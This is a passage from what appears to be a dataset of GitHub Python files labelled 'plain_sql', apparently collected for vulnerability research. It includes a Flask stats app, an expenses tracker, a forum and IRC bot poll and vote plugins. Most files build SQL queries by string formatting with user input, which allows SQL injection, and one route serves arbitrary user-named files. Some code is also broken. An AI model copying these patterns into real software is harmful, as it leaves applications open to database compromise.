db.cursor()\n    query = \"select date, platform, branch, numpushes, numjobs, sumduration from dailyjobs \\\n             where date>='%s' and date <='%s'\\\n             order by case platform \\\n                when 'linux' then 1 \\\n                when 'osx' then 2  \\\n                when 'win' then 3  \\\n                when 'android' then 4 \\\n                end\" % (start_date, end_date)\n    cursor.execute(query)\n    output = {}\n    for rows in cursor.fetchall():\n        date = str(rows[0])\n        platform = rows[1]\n        branch = rows[2]\n        numpushes = int(rows[3])\n        numjobs = int(rows[4])\n        sumduration = int(rows[5])\n\n        if date not in output:\n            output[date] = {'mozilla-inbound': [], 'fx-team': [], 'try': [], 'autoland': []}\n        if 'mozilla-inbound' in branch:\n            output[date]['mozilla-inbound'].append([platform, numpushes, numjobs, sumduration])\n        elif 'fx-team' in branch:\n            output[date]['fx-team'].append([platform, numpushes, numjobs, sumduration])\n        elif 'try' in branch:\n            output[date]['try'].append([platform, numpushes, numjobs, sumduration])\n        elif 'autoland' in branch:\n            output[date]['autoland'].append([platform, numpushes, numjobs, sumduration])\n    return {'dailyjobs': output}\n\n\n@app.errorhandler(404)\n@json_response\ndef handler404(error):\n    return {\"status\": 404, \"msg\": str(error)}\n\n\n@app.route(\"/\")\ndef root_directory():\n    return template(\"index.html\")\n\n\n@app.route(\"/<string:filename>\")\ndef template(filename):\n    filename = os.path.join(static_path, filename)\n    if os.path.exists(filename):\n        with open(filename, 'r') as f:\n            response_body = f.read()\n        return response_body\n    abort(404)\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=8157, debug=False)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/leeorb321/expenses/blob/807701354bb8b175eb13eb05810faa727aad674d",
        "file_path": "/db.py",
        "source": "import sys\nfrom os import system\nimport psycopg2\nimport urllib.parse\nimport os\n\ndef check_heroku_db():\n    if 'DATABASE_URL' in os.environ and os.environ['DATABASE_URL']:\n        urllib.parse.uses_netloc.append(\"postgres\")\n        url = urllib.parse.urlparse(os.environ[\"DATABASE_URL\"])\n\n        conn = psycopg2.connect(\n            database=url.path[1:],\n            user=url.username,\n            password=url.password,\n            host=url.hostname,\n            port=url.port\n        )\n        return conn\n    else:\n        conn = psycopg2.connect(database=\"expenses\")\n        return conn\n\n    return False\n\ndef connect():\n    try:\n        conn = check_heroku_db()\n        cur = conn.cursor()\n\n        print(conn)\n\n        cur.execute('''SELECT person_name FROM persons;''')\n        persons = [ person[0] for person in list(cur.fetchall()) ]\n\n        cur.execute('''SELECT cat_name FROM categories;''')\n        categories = [ category[0] for category in list(cur.fetchall()) ]\n\n        conn.commit()\n        conn.close()\n        return persons, categories\n\n    except psycopg2.DatabaseError as e:\n        print('Error %s' % e)\n        sys.exit(1)\n\ndef new_expense(person, expense_date, amount, category, description):\n    try:\n        conn = check_heroku_db()\n        cur = conn.cursor()\n        cur.execute('''INSERT INTO ledger (person_id, txn_date, amount, category_id, description)\n                        SELECT (SELECT id FROM persons WHERE person_name='%s'), '%s', %d,\n                        (SELECT id FROM categories WHERE cat_name='%s'), '%s' ;'''\n                        % (person, expense_date, amount, category, description))\n        conn.commit()\n        conn.close()\n\n    except psycopg2.DatabaseError as e:\n        print('Error %s' % e)\n        sys.exit(1)\n\ndef new_category(category_name):\n    try:\n        conn = check_heroku_db()\n        cur = conn.cursor()\n        cur.execute('''INSERT INTO categories (cat_name) VALUES (%s)''', (category_name,))\n        conn.commit()\n        conn.close()\n\n    except psycopg2.DatabaseError as e:\n        print('Error %s' % e)\n        sys.exit(1)\n\ndef update_expense(new_person, new_date, new_amount, new_category, new_description, txn_id):\n    try:\n        conn = psycopg2.connect(database=\"expenses\")\n        cur = conn.cursor()\n        cur.execute('''UPDATE ledger SET\n                        person_id = (SELECT id FROM persons WHERE person_name = '%s'),\n                        txn_date = '%s',\n                        amount = '%s',\n                        category_id = (SELECT id FROM categories WHERE cat_name = '%s'),\n                        description = '%s'\n                        WHERE id = '%s';\n                    ''' % (new_person, new_date, new_amount, new_category, new_description, txn_id))\n        conn.commit()\n        conn.close()\n    except psycopg2.DatabaseError as e:\n        print('Error %s' % e)\n        sys.exit(1)\n\ndef delete_expense(txn_id):\n    try:\n        conn = psycopg2.connect(database=\"expenses\")\n        cur = conn.cursor()\n        cur.execute('''DELETE FROM ledger WHERE id = '%s';''' % txn_id)\n\n        conn.commit()\n        conn.close()\n    except psycopg2.DatabaseError as e:\n        print('Error %s' % e)\n        sys.exit(1)\n\ndef display_all_data():\n    conn = check_heroku_db()\n    cur = conn.cursor()\n    out = []\n\n    query = '''\n            SELECT txn_date, amount, cat_name, description, person_name, ledger.id\n            FROM ledger\n            JOIN persons\n                ON ledger.person_id=persons.id\n            JOIN categories\n                ON ledger.category_id=categories.id\n            '''\n\n    cur.execute(query)\n    results = cur.fetchall()\n\n    for row in results:\n        row = list(row)\n        row[1] = float(row[1])/100\n        row = [ row[i].capitalize() if type(row[i]) == str and i != 3 else row[i] for i in range(len(row)) ]\n        out.append(row)\n\n    out.sort(key=lambda row: row[0])\n\n    out_dicts = []\n    for row in out:\n        out_dicts.append({\n            'date': row[0],\n            'amount': row[1],\n            'category': row[2],\n            'description': row[3],\n            'person': row[4],\n            'id': row[5]\n            })\n\n    conn.commit()\n    conn.close()\n    return out_dicts\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Christianq010/vagrant-box-Intro-to-relational-DB/blob/4dc20b540b979ba0d8acec9ffd0a8c186d406236",
        "file_path": "/forum/forumdb.py",
        "source": "# \"Database code\" for the DB Forum.\n\nimport datetime\nimport psycopg2\n\n\n# Get posts from database\n\ndef get_posts():\n  # Connect to database.\n  db = psycopg2.connect(\"dbname=forum\")\n  # Create cursor to sort\n  c = db.cursor()\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  c.execute(\"SELECT time, content FROM posts order by time DESC\")\n  posts = ({'content': str(row[1]), 'time': str(row[0])}\n           for row in c.fetchall())\n  db.close()\n  return posts\n\n# Add Post to Database\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  db = psycopg2.connect(\"dbname=forum\")\n  c = db.cursor()\n  c.execute(\"INSERT INTO posts (content) VALUES ('%s')\" % content)\n  db.commit()\n  db.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/gstack/uguubot/blob/6004a7c765917f73266cc89f8a4c637b0c8f516d",
        "file_path": "/plugins/vote.py",
        "source": "from util import hook, user, database\nimport time\n\ndb_ready = False\n\ndef db_init(db):\n    global db_ready\n    db.execute(\"CREATE TABLE if not exists votes(chan, action, target, voters, time, primary key(chan, action, target));\")\n    db.commit()\n    db_ready = True\n\ndef process_vote(target,action,chan,mask,db,notice,conn):\n    if ' ' in target: \n        notice('Invalid nick')\n        return\n\n    try: votes2kick = database.get(db,'channels','votekick','chan',chan)\n    except: votes2kick = 10\n    try: votes2ban = database.get(db,'channels','voteban','chan',chan)\n    except: votes2ban = 10\n\n    if len(target) is 0:\n        if action is 'kick': notice('Votes required to kick: {}'.format(votes2kick))\n        elif action is 'ban': notice('Votes required to ban: {}'.format(votes2ban))\n        return\n\n    votefinished = False\n    global db_ready\n    if not db_ready: db_init(db)\n    chan = chan.lower()\n    target = target.lower()\n    voter = user.format_hostmask(mask)\n    voters = db.execute(\"SELECT voters FROM votes where chan='{}' and action='{}' and target like '{}'\".format(chan,action,target)).fetchone()\n\n    if conn.nick.lower() in target: return \"I dont think so Tim.\"\n\n    if voters: \n        voters = voters[0]\n        if voter in voters: \n            notice(\"You have already voted.\")\n            return\n        else:\n            voters = '{} {}'.format(voters,voter).strip()\n            notice(\"Thank you for your vote!\")\n    else: \n        voters = voter\n\n    votecount = len(voters.split(' '))\n\n    if 'kick' in action: \n        votemax = int(votes2kick)\n        if votecount >= votemax:\n            votefinished = True\n            conn.send(\"KICK {} {} :{}\".format(chan, target, \"You have been voted off the island.\"))\n    if 'ban' in action:\n        votemax = int(votes2ban)\n        if votecount >= votemax:\n            votefinished = True\n            conn.send(\"MODE {} +b {}\".format(chan, user.get_hostmask(target,db)))\n            conn.send(\"KICK {} {} :\".format(chan, target, \"You have been voted off the island.\"))\n    \n    if votefinished: db.execute(\"DELETE FROM votes where chan='{}' and action='{}' and target like '{}'\".format(chan,action,target))\n    else: db.execute(\"insert or replace into votes(chan, action, target, voters, time) values(?,?,?,?,?)\", (chan, action, target, voters, time.time()))\n        \n    db.commit()\n    return (\"Votes to {} {}: {}/{}\".format(action, target, votecount,votemax))\n\n\n\n@hook.command(autohelp=False)\ndef votekick(inp, nick=None, mask=None, conn=None, chan=None, db=None, notice=None):\n    return process_vote(inp,'kick',chan,mask,db,notice,conn)\n\n\n@hook.command(autohelp=False)\ndef voteban(inp, nick=None, mask=None, conn=None, chan=None, db=None, notice=None):\n    return process_vote(inp,'ban',chan,mask,db,notice,conn)\n\n\n# UPVOTE\n \n\n # @hook.command(autohelp=False)\n# def vote(inp, nick=None, mask=None,conn=None, chan=None, db=None, notice=None):\n#     global db_ready\n#     if not db_ready: db_init(db)\n#     chan = chan.lower()\n#     action = inp.split(\" \")[0].lower()\n#     target = inp.split(\" \")[1].lower()\n#     voter = user.format_hostmask(mask)\n#     voters = db.execute(\"SELECT voters FROM votes where chan='{}' and action='{}' and target like '{}'\".format(chan,action,target)).fetchone()\n\n#     if voters: \n#         voters = voters[0]\n#         if voter in voters: \n#             notice(\"You have already voted.\")\n#             return\n#         else:\n#             voters = '{} {}'.format(voters,voter).strip()\n#             notice(\"Thank you for your vote!\")\n#     else: \n#         voters = voter\n\n#     votecount = len(voters.split(' '))\n\n#     if votecount >= 4: \n#         if 'kick' in action: \n#             conn.send(\"KICK {} {} :{}\".format(chan, target, \"You have been voted off the island.\"))\n#         if 'ban' in action:\n#             conn.send(\"MODE {} +b {}\".format(chan, target))\n#             conn.send(\"KICK {} {} :\".format(chan, target, \"You have been voted off the island.\"))\n#         db.execute(\"DELETE FROM votes where chan='{}' and action='{}' and target like '{}'\".format(chan,action,target))\n#         db.commit()\n#         return\n#     else:\n#         db.execute(\"insert or replace into votes(chan, action, target, voters, time) values(?,?,?,?,?)\", (chan, action, target, voters, time.time()))\n#         db.commit()\n#         notice(\"Vote count to {} {}: {} / 4\".format(action, target, votecount))\n#         return",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/FrozenPigs/Taigabot/blob/6004a7c765917f73266cc89f8a4c637b0c8f516d",
        "file_path": "/plugins/vote.py",
        "source": "from util import hook, user, database\nimport time\n\ndb_ready = False\n\ndef db_init(db):\n    global db_ready\n    db.execute(\"CREATE TABLE if not exists votes(chan, action, target, voters, time, primary key(chan, action, target));\")\n    db.commit()\n    db_ready = True\n\ndef process_vote(target,action,chan,mask,db,notice,conn):\n    if ' ' in target: \n        notice('Invalid nick')\n        return\n\n    try: votes2kick = database.get(db,'channels','votekick','chan',chan)\n    except: votes2kick = 10\n    try: votes2ban = database.get(db,'channels','voteban','chan',chan)\n    except: votes2ban = 10\n\n    if len(target) is 0:\n        if action is 'kick': notice('Votes required to kick: {}'.format(votes2kick))\n        elif action is 'ban': notice('Votes required to ban: {}'.format(votes2ban))\n        return\n\n    votefinished = False\n    global db_ready\n    if not db_ready: db_init(db)\n    chan = chan.lower()\n    target = target.lower()\n    voter = user.format_hostmask(mask)\n    voters = db.execute(\"SELECT voters FROM votes where chan='{}' and action='{}' and target like '{}'\".format(chan,action,target)).fetchone()\n\n    if conn.nick.lower() in target: return \"I dont think so Tim.\"\n\n    if voters: \n        voters = voters[0]\n        if voter in voters: \n            notice(\"You have already voted.\")\n            return\n        else:\n            voters = '{} {}'.format(voters,voter).strip()\n            notice(\"Thank you for your vote!\")\n    else: \n        voters = voter\n\n    votecount = len(voters.split(' '))\n\n    if 'kick' in action: \n        votemax = int(votes2kick)\n        if votecount >= votemax:\n            votefinished = True\n            conn.send(\"KICK {} {} :{}\".format(chan, target, \"You have been voted off the island.\"))\n    if 'ban' in action:\n        votemax = int(votes2ban)\n        if votecount >= votemax:\n            votefinished = True\n            conn.send(\"MODE {} +b {}\".format(chan, user.get_hostmask(target,db)))\n            conn.send(\"KICK {} {} :\".format(chan, target, \"You have been voted off the island.\"))\n    \n    if votefinished: db.execute(\"DELETE FROM votes where chan='{}' and action='{}' and target like '{}'\".format(chan,action,target))\n    else: db.execute(\"insert or replace into votes(chan, action, target, voters, time) values(?,?,?,?,?)\", (chan, action, target, voters, time.time()))\n        \n    db.commit()\n    return (\"Votes to {} {}: {}/{}\".format(action, target, votecount,votemax))\n\n\n\n@hook.command(autohelp=False)\ndef votekick(inp, nick=None, mask=None, conn=None, chan=None, db=None, notice=None):\n    return process_vote(inp,'kick',chan,mask,db,notice,conn)\n\n\n@hook.command(autohelp=False)\ndef voteban(inp, nick=None, mask=None, conn=None, chan=None, db=None, notice=None):\n    return process_vote(inp,'ban',chan,mask,db,notice,conn)\n\n\n# UPVOTE\n \n\n # @hook.command(autohelp=False)\n# def vote(inp, nick=None, mask=None,conn=None, chan=None, db=None, notice=None):\n#     global db_ready\n#     if not db_ready: db_init(db)\n#     chan = chan.lower()\n#     action = inp.split(\" \")[0].lower()\n#     target = inp.split(\" \")[1].lower()\n#     voter = user.format_hostmask(mask)\n#     voters = db.execute(\"SELECT voters FROM votes where chan='{}' and action='{}' and target like '{}'\".format(chan,action,target)).fetchone()\n\n#     if voters: \n#         voters = voters[0]\n#         if voter in voters: \n#             notice(\"You have already voted.\")\n#             return\n#         else:\n#             voters = '{} {}'.format(voters,voter).strip()\n#             notice(\"Thank you for your vote!\")\n#     else: \n#         voters = voter\n\n#     votecount = len(voters.split(' '))\n\n#     if votecount >= 4: \n#         if 'kick' in action: \n#             conn.send(\"KICK {} {} :{}\".format(chan, target, \"You have been voted off the island.\"))\n#         if 'ban' in action:\n#             conn.send(\"MODE {} +b {}\".format(chan, target))\n#             conn.send(\"KICK {} {} :\".format(chan, target, \"You have been voted off the island.\"))\n#         db.execute(\"DELETE FROM votes where chan='{}' and action='{}' and target like '{}'\".format(chan,action,target))\n#         db.commit()\n#         return\n#     else:\n#         db.execute(\"insert or replace into votes(chan, action, target, voters, time) values(?,?,?,?,?)\", (chan, action, target, voters, time.time()))\n#         db.commit()\n#         notice(\"Vote count to {} {}: {} / 4\".format(action, target, votecount))\n#         return",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/FrozenPigs/Taigabot/blob/6004a7c765917f73266cc89f8a4c637b0c8f516d",
        "file_path": "/plugins/poll.py",
        "source": "from util import hook, http\nimport time\n\n# TODO: poll timer support\n\ndb_ready = False\n\ndef db_init(db):\n    \"check to see that our db has the the seen table and return a connection.\"\n    \"\"\"Implements a poll system.\"\"\"\n    db.execute('''create table if not exists polls (\n              pollID int auto_increment primary key,\n              question text,\n              active bool )''')\n    db.execute('''create table if not exists answers (\n              answerID int auto_increment primary key,\n              pollID int,\n              'index' int,\n              answer text,\n              unique(pollID, 'index') )''')\n    db.execute('''create table if not exists votes (\n              voteID int auto_increment primary key,\n              answerID int,\n              nick varchar(255) )''')\n    db.commit()\n    print \"Created Database\"\n    db_ready = True\n\n# def load():\n    \n    # registerFunction(\"open poll %S\", openPoll, \"open poll <question>\", restricted = True)\n    # registerFunction(\"close poll\", closePoll, restricted = True)\n    # registerFunction(\"show poll %!i\", showPoll, \"show poll [poll ID]\")\n    # registerFunction(\"vote for %i\", voteFor, \"vote for <answer ID>\")\n    # registerFunction(\"vote new %S\", voteNew, \"vote new <answer>\")\n    # registerFunction(\"search poll %S\", searchPoll, \"search poll <search term>\")\n    # registerFunction(\"delete poll %i\", deletePoll, \"delete poll <poll ID>\", restricted = True)\n    # registerModule(\"Poll\", load)\n\n\n@hook.command(adminonly=True)\ndef openPoll(question, reply=None, db=None):\n    \"\"\"Creates a new poll.\"\"\"\n    if not db_ready: db_init(db)\n    try:\n        active = db.execute(\"SELECT pollID FROM polls WHERE active = 1\").fetchone()[0]\n        if active: \n            reply(\"There already is an open poll.\")\n            return\n    except:\n        db.execute(\"INSERT INTO polls (question, active) VALUES ('{}', 1)\".format(question))\n        reply(\"Opened new poll: {}\".format(question))\n        #reply(\"Poll opened!\")\n    return\n\n\n@hook.command(adminonly=True, autohelp=False)\ndef closePoll(inp, reply=None, db=None):\n    \"\"\"Closes the current poll.\"\"\"\n    if not db_ready: db_init(db)\n    active = db.execute(\"SELECT pollID FROM polls WHERE active = 1\")\n    if not active[0]:\n        reply(\"No poll is open at the moment.\")\n        return\n    reply(\"Pool's closed.\")\n    for (answer, votes) in db.execute(\"SELECT answer, count(voteID) FROM polls INNER JOIN answers ON answers.pollID = polls.pollID LEFT JOIN votes ON votes.answerID = answers.answerID WHERE active = 1 GROUP BY answers.answerID, answer ORDER BY count(voteID) DESC LIMIT 1\"):\n        reply(\"Winning entry: '%s' with %s votes\" % (answer, votes))\n    db.execute(\"UPDATE polls SET active = 0\")\n\n\n@hook.command(autohelp=False)\ndef showPoll(pollID, db=None):\n    \"\"\"Shows the answers for a given poll.\"\"\"\n    if not db_ready: db_init(db)\n    if pollID == None:\n        poll = db.execute(\"SELECT pollID, question FROM polls WHERE active = 1\")\n        if len(poll) == 0:\n            reply(\"There's no poll open.\")\n            return\n    else:\n        poll = db.execute(\"SELECT pollID, question FROM polls WHERE pollID = '{}'\".format(pollID))\n        if len(poll) == 0:\n            reply(\"No such poll found.\")\n            return\n    pollID = poll[0][0]\n    question = poll[0][1]\n    reply(question)\n    for (index, answer, votes) in db.execute(\"SELECT 'index', answer, count(voteID) FROM answers LEFT JOIN votes ON votes.answerID = answers.answerID WHERE pollID = {} GROUP BY answers.answerID, 'index', answer ORDER BY 'index' ASC\".format(pollID, )):\n        reply(\"%s. %s (%s)\" % (index, answer, votes))\n\n\n@hook.command\ndef voteFor(answerIndex, reply=None, db=None):\n    \"\"\"Casts a vote for the current poll.\"\"\"\n    if not db_ready: db_init(db)\n    polls = db.execute(\"SELECT pollID FROM polls WHERE active = 1\")\n    if len(polls) == 0:\n        reply(\"No poll is open at the moment.\")\n        return\n    pollID = polls[0][0]\n    answers = db.execute(\"SELECT answerID FROM answers WHERE pollID = %s AND 'index' = %s\" % (pollID, answerIndex))\n    if len(answers) == 0:\n        reply(\"No item #%s found.\" % answerIndex)\n        return\n    answerID = answers[0][0]\n    db.execute(\"DELETE FROM votes WHERE nick = %s AND answerID IN (SELECT answerID FROM answers WHERE pollID = %s)\", (sender, pollID))\n    db.execute(\"INSERT INTO votes (answerID, nick) VALUES (%s, %s)\", (answerID, sender))\n    reply(\"Vote registered.\")\n\n\n@hook.command\ndef voteNew(answer, reply=None, db=None):\n    \"\"\"Creates a new possible answer for the current poll and votes for it.\"\"\"\n    if not db_ready: db_init(db)\n    polls = db.execute(\"SELECT pollID FROM polls WHERE active = 1\")\n    if len(polls) == 0:\n        reply(\"No poll is open at the moment.\")\n        return\n    pollID = polls[0][0]\n    maxIndex = db.execute(\"SELECT MAX('index') FROM answers WHERE answers.pollID = %s\", pollID)[0][0]\n    if maxIndex == None:\n        index = 1\n    else:\n        index = maxIndex + 1\n    db.execute(\"INSERT INTO answers (pollID, 'index', answer) VALUES (%s, %s, %s)\", (pollID, index, answer))\n    answerID = db.execute(\"SELECT answerID FROM answers WHERE pollID = %s AND 'index' = %s\", (pollID, index))[0][0]\n    db.execute(\"DELETE FROM votes WHERE nick = %s AND answerID IN (SELECT answerID FROM answers WHERE pollID = %s)\", (sender, pollID))\n    db.execute(\"INSERT INTO votes (answerID, nick) VALUES (%s, %s)\", (answerID, sender))\n    reply(\"Vote added.\")\n\n\n@hook.command\ndef searchPoll(searchTerm, reply=None, db=None):\n    \"\"\"Search polls matching a given search term.\"\"\"\n    if not db_ready: db_init(db)\n    polls = db.execute(\"SELECT pollID, question FROM polls WHERE question LIKE %s\", ('%' + searchTerm + '%',))\n    if len(polls) == 0:\n        reply(\"No polls found.\")\n        return\n    if len(polls) > 3:\n        reply(\"%s entries found, refine your search\" % len(polls))\n        return\n    for (pollID, question) in polls:\n        winners = db.execute(\"SELECT answer, count(voteID) FROM answers INNER JOIN votes ON votes.answerID = answers.answerID WHERE pollID = %s GROUP BY answers.answerID, answer ORDER BY count(voteID) DESC LIMIT 1\", (pollID, ))\n        if len(winners) == 0:\n            reply(\"%s. %s\" % (pollID, question))\n        else:\n            reply(\"%s. %s -- Winner: %s (%s)\" % (pollID, question, winners[0][0], winners[0][1]))\n\n\n@hook.command(adminonly=True)\ndef deletePoll(pollID, reply=None, db=None):\n    \"\"\"Deletes a poll from the archives.\"\"\"\n    if not db_ready: db_init(db)\n    if len(db.execute(\"SELECT pollID FROM polls WHERE pollID = %s\", (pollID, ))) == 0:\n        reply(\"No such poll found\")\n    db.execute(\"DELETE FROM votes WHERE answerID IN (SELECT answerID FROM answers WHERE pollID = %s)\", (pollID, ))\n    db.execute(\"DELETE FROM answers WHERE pollID = %s\", (pollID, ))\n    db.execute(\"DELETE FROM polls WHERE pollID = %s\", (pollID, ))\n    reply(\"Poll deleted.\")\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/mlockett42/pypddemo/blob/5bde889531cb3c7bb40f0bc0c9bd86196cabf98b",
        "file_path": "/doop/DocumentCollectionHelper.py",
        "source": "#DocumentCollectionHelper.py\n# A collection of functions that work with DocumentCollections and do thing not available in pyjs\n\nimport sqlite3\nimport os\nfrom collections import defaultdict\nfrom HistoryEdge import HistoryEdge\nfrom HistoryGraph import HistoryGraph\n\ndef SaveDocumentCollection(dc, filenameedges, filenamedata):\n    try:\n        os.remove(filenameedges)\n    except:\n        pass\n    c = sqlite3.connect(filenameedges)\n    # Create table\n    c.execute('''CREATE TABLE IF NOT EXISTS edge (\n                    documentid text, \n                    documentclassname text, \n                    edgeclassname text, \n                    edgeid text PRIMARY KEY, \n                    startnode1id text, \n                    startnode2id text, \n                    endnodeid text, \n                    propertyownerid text, \n                    propertyname text, \n                    propertyvalue text, \n                    propertytype text\n                )''')\n    c.execute(\"DELETE FROM edge\")\n    for documentid in dc.objects:\n        documentlist = dc.objects[documentid]\n        for document in documentlist:\n            history = document.history\n            edge = history.edges[edgeid]\n            startnodes = list(edge.startnodes)\n            if len(edge.startnodes) == 1:\n                startnode1id = startnodes[0]\n                startnode2id = \"\"\n            elif len(edge.startnodes) == 2:\n                startnode1id = startnodes[0]\n                startnode2id = startnodes[1]\n            else:\n                assert False\n            \n            if edge.propertytype is None:\n                propertytypename = \"\"\n            else:\n                propertytypename = edge.propertytype.__name__\n            c.execute(\"INSERT INTO edge VALUES ('\" + document.id + \"', '\" + document.__class__.__name__ + \"', '\" + edge.__class__.__name__ + \"', '\" + edge.edgeid + \"', \" +\n                \"'\" + startnode1id + \"', '\" + startnode2id + \"', '\" + edge.endnode + \"', '\" + edge.propertyownerid + \"', '\" + edge.propertyname + \"', '\" + str(edge.propertyvalue) + \"', \"\n                \"'\" + propertytypename + \"')\")\n\n    c.commit()\n    c.close()\n\n    try:\n        os.remove(filenamedata)\n    except:\n        pass\n    database = sqlite3.connect(filenamedata)\n    foreignkeydict = defaultdict(list)\n    for classname in dc.classes:\n        theclass = dc.classes[classname]\n        variables = [a for a in dir(theclass) if not a.startswith('__') and not callable(getattr(theclass,a))]\n        for a in variables:\n            if isinstance(getattr(theclass, a), FieldList):\n                foreignkeydict[getattr(theclass, a).theclass.__name__].append((classname, a))\n    columndict = defaultdict(list)\n    for classname in dc.classes:\n        theclass = dc.classes[classname]\n        variables = [a for a in dir(theclass) if not a.startswith('__') and not callable(getattr(theclass,a))]\n        for a in variables:\n            if isinstance(getattr(theclass, a), FieldList) == False:\n                columndict[classname].append((a, \"int\" if isinstance(getattr(theclass, a), FieldInt) else \"text\"))\n    for k in foreignkeydict:\n        for (classname, a) in foreignkeydict[k]:\n            columndict[k].append((classname + \"id\", \"text\"))\n    for classname in columndict:\n        columnlist = columndict[classname]\n        sql = \"CREATE TABLE \" + classname + \" (id text \"\n        for (a, thetype) in columnlist:\n            sql += \",\"\n            sql += a + \" \" + thetype\n        sql += \")\"\n\n        database.execute(sql)\n    \n    for documentid in dc.objects:\n        SaveDocumentObject(database, dc.objects[documentid][0], None, foreignkeydict, columndict)\n\n    database.commit()\n\ndef SaveDocumentObject(self, documentobject, parentobject, foreignkeydict, columndict):\n    variables = [a for a in dir(documentobject.__class__) if not a.startswith('__') and not callable(getattr(documentobject.__class__,a))]\n    for a in variables:\n        if isinstance(getattr(documentobject.__class__, a), FieldList):\n            for childobj in getattr(documentobject, a):\n                self.SaveDocumentObject(childobj, documentobject, foreignkeydict, columndict)\n    foreignkeyclassname = \"\"\n    if documentobject.__class__.__name__ in foreignkeydict:\n        if len(foreignkeydict[documentobject.__class__.__name__]) == 0:\n            pass #No foreign keys to worry about\n        elif len(foreignkeydict[documentobject.__class__.__name__]) == 1:\n            (foreignkeyclassname, a) = foreignkeydict[documentobject.__class__.__name__][0]\n        else:\n            assert False #Only one foreign key allowed\n    sql = \"INSERT INTO \" + documentobject.__class__.__name__ + \" VALUES ('\" + documentobject.id + \"'\"\n    for (columnname, columntype) in columndict[documentobject.__class__.__name__]:\n        if columntype == \"int\":\n            quote = \"\"\n        elif columntype == \"text\":\n            quote = \"'\"\n        else:\n            assert False\n            quote = \"\"\n        sql += \",\"\n        if foreignkeyclassname != \"\" and foreignkeyclassname + \"id\" == columnname:\n            sql += quote + parentobject.id + quote\n        else:\n            sql += quote + str(getattr(documentobject, columnname)) + quote\n    sql += \")\"\n    self.database.execute(sql)\n\nfirstsaved = False\nfirstsavededgeid = \"\"\n\ndef SaveEdges(dc, filenameedges, edges):\n    c = sqlite3.connect(filenameedges)\n    # Create table\n    for edge in edges:\n        startnodes = list(edge.startnodes)\n        if len(edge.startnodes) == 1:\n            startnode1id = startnodes[0]\n            startnode2id = \"\"\n        elif len(edge.startnodes) == 2:\n            startnode1id = startnodes[0]\n            startnode2id = startnodes[1]\n        else:\n            assert False\n        \n        if edge.propertytype is None:\n            propertytypename = \"\"\n        else:\n            propertytypename = edge.propertytype\n        #try:\n        if startnode1id == \"\":\n            global firstsavededgeid\n            if firstsavededgeid == \"\":\n                firstsavededgeid = edge.edgeid\n            global firstsaved\n            assert firstsaved == False or firstsavededgeid == edge.edgeid\n            firstsaved = True\n        c.execute(\"INSERT OR IGNORE INTO edge VALUES ('\" + edge.documentid + \"', '\" + edge.documentclassname + \"', '\" + edge.__class__.__name__ + \"', '\" + edge.edgeid + \"', \" +\n                \"'\" + startnode1id + \"', '\" + startnode2id + \"', '\" + edge.endnode + \"', '\" + edge.propertyownerid + \"', '\" + edge.propertyname + \"', '\" + str(edge.propertyvalue) + \"', \"\n                \"'\" + propertytypename + \"')\")\n    c.commit()\n    c.close()\n\n    #try:\n    #    os.remove(filenamedata)\n    #except:\n    #    pass\n    #database = sqlite3.connect(filenamedata)\n    #foreignkeydict = defaultdict(list)\n    #for classname in dc.classes:\n    #    theclass = dc.classes[classname]\n    #    variables = [a for a in dir(theclass) if not a.startswith('__') and not callable(getattr(theclass,a))]\n    #    for a in variables:\n    #        if isinstance(getattr(theclass, a), FieldList):\n    #            foreignkeydict[getattr(theclass, a).theclass.__name__].append((classname, a))\n    #columndict = defaultdict(list)\n    #for classname in dc.classes:\n    #    theclass = dc.classes[classname]\n    #    variables = [a for a in dir(theclass) if not a.startswith('__') and not callable(getattr(theclass,a))]\n    #    for a in variables:\n    #        if isinstance(getattr(theclass, a), FieldList) == False:\n    #            columndict[classname].append((a, \"int\" if isinstance(getattr(theclass, a), FieldInt) else \"text\"))\n    #for k in foreignkeydict:\n    #    for (classname, a) in foreignkeydict[k]:\n    #        columndict[k].append((classname + \"id\", \"text\"))\n    #for classname in columndict:\n    #    columnlist = columndict[classname]\n    #    sql = \"CREATE TABLE \" + classname + \" (id text \"\n    #    for (a, thetype) in columnlist:\n    #        sql += \",\"\n    #        sql += a + \" \" + thetype\n    #    sql += \")\"#\n    #\n    #    database.execute(sql)\n    #\n    #for documentid in dc.objects:\n    #    SaveDocumentObject(database, dc.objects[documentid][0], None, foreignkeydict, columndict)\n    #\n    #database.commit()\n\ndef SaveDocumentObject(database, documentobject, parentobject, foreignkeydict, columndict):\n    variables = [a for a in dir(documentobject.__class__) if not a.startswith('__') and not callable(getattr(documentobject.__class__,a))]\n    for a in variables:\n        if isinstance(getattr(documentobject.__class__, a), FieldList):\n            for childobj in getattr(documentobject, a):\n                SaveDocumentObject(database, childobj, documentobject, foreignkeydict, columndict)\n    foreignkeyclassname = \"\"\n    if documentobject.__class__.__name__ in foreignkeydict:\n        if len(foreignkeydict[documentobject.__class__.__name__]) == 0:\n            pass #No foreign keys to worry about\n        elif len(foreignkeydict[documentobject.__class__.__name__]) == 1:\n            (foreignkeyclassname, a) = foreignkeydict[documentobject.__class__.__name__][0]\n        else:\n            assert False #Only one foreign key allowed\n    sql = \"INSERT INTO \" + documentobject.__class__.__name__ + \" VALUES ('\" + documentobject.id + \"'\"\n    for (columnname, columntype) in columndict[documentobject.__class__.__name__]:\n        if columntype == \"int\":\n            quote = \"\"\n        elif columntype == \"text\":\n            quote = \"'\"\n        else:\n            assert False\n            quote = \"\"\n        sql += \",\"\n        if foreignkeyclassname != \"\" and foreignkeyclassname + \"id\" == columnname:\n            sql += quote + parentobject.id + quote\n        else:\n            sql += quote + str(getattr(documentobject, columnname)) + quote\n    sql += \")\"\n    database.execute(sql)\n    \ndef GetSQLObjects(self, query):\n    ret = list()\n    cur = self.database.cursor()    \n    cur.execute(query)\n\n    rows = cur.fetchall()\n    for row in rows:\n        for classname in self.documentsbyclass:\n            for obj in self.documentsbyclass[classname]:\n                if obj.id == row[0]:\n                    ret.append(obj)\n    return ret\n        \ndef LoadDocumentCollection(dc, 